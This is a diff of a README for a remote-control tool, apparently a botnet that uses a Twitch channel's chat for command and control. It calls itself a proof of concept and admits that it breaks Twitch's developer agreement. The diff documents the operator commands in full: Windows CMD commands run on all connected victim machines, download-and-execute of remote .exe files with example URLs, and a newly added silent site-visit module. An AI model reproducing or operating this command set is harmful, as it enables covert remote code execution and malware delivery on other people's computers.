@@ -12,9 +12,11 @@ The usage of this program directly violates the Twitch Developer Agreement. The 
 This program was created as a Proof of Concept and it is not intended to be used in a malicious way. I am not responsible for any damages or criminal charges that come from using it.
 
 # Features
-```cmd``` Windows CMD commands.
+`cmd` Windows CMD commands. Structured as `!act client cmd commandhere true`
 
-```de``` Download and execute. File is removed after execution.
+`de` Download and execute. File is removed after execution. Structured as `!act client de https://www.yoururlhere.com/file.exe true`
+
+`visit` Silent site visit. Returns the site response after a successful execution. Structured as `!act client visit https://www.yoururlhere.com/ true`
 
 # Usage
 Navigate to the twitch page of the channel you selected when making the program.
@@ -23,16 +25,14 @@ Upon connection to a server, a new client will announce its presence and client 
 
 ![New Connection.](https://i.imgur.com/fT6yice.png)
 
-```
-!list
-```
+`!list`
 
 ![List connections.](https://i.imgur.com/RY81sGt.png)
 
 This program also features different modules which can be used.
-```
-!act client command action true
-```
+
+`!act client command action true`
+
 - Act is the keyword to use a command for the client.
 - Client specifies a singular user or a group. You can use a specific name (ex: DESKTOP-TEST) or 'all'.
 - Command specifies the intended module to use.
@@ -41,9 +41,7 @@ This program also features different modules which can be used.
 
 An example cmd command would be:
 
-```
-!act all cmd start. true
-```
+`!act all cmd start. true`
 
 ![Client action.](https://i.imgur.com/g7d5P83.png)
 
@@ -51,9 +49,8 @@ This would open the current directory on every connected clients PC.
 
 An example download+execute command would be:
 
-```
-!act DESKTOP-TEST de https://example.com/files/file.exe true
-```
+`!act DESKTOP-TEST de https://example.com/files/file.exe true`
+
 It currently only supports exe files.
 
 # Creating the program.
